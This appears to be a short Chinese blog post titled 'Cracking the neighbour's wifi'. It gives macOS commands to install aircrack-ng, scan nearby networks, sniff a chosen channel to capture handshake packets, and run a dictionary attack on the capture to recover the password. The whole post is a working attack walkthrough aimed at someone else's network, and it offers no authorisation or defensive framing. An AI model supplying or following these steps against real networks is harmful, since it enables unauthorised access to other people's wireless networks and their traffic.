---
title: 破解隔壁 wifi
---

首先要确保电脑安装 Xcode

```bash
brew install aircrack-ng
brew link aircrack-ng
airport -s #  查看到附近的 Wifi 信息
```

![](https://gitee.com/alvin0216/cdn/raw/master/img/wifi.png)

RSSI 信号，CHANNEL 这是我们用来监听的网卡渠道。

```bash
sudo airport en0 sniff 10 # 10 代表上图的 GL-WIFI
```

![](https://gitee.com/alvin0216/cdn/raw/master/img/wifi2.png)

按`「 control ＋ c 」`退出抓包，会自动保存并提示抓得包保存路径：

新建字段：

```bash
touch pwd.txt # 字典密码表
# 一顿操作
aircrack-ng -w pwd.txt airportSniff8aPHR3.cap # airportSniff8aPHR3.cap 刚刚抓的包
```

当 `GL-WIFI` 有人重新连接后，且进行过网页浏览可以看到抓包信息。

![](https://gitee.com/alvin0216/cdn/raw/master/img/wifi3.png)

输入对应的 wifi 编号，破解密码：

![](https://gitee.com/alvin0216/cdn/raw/master/img/wifi4.png)
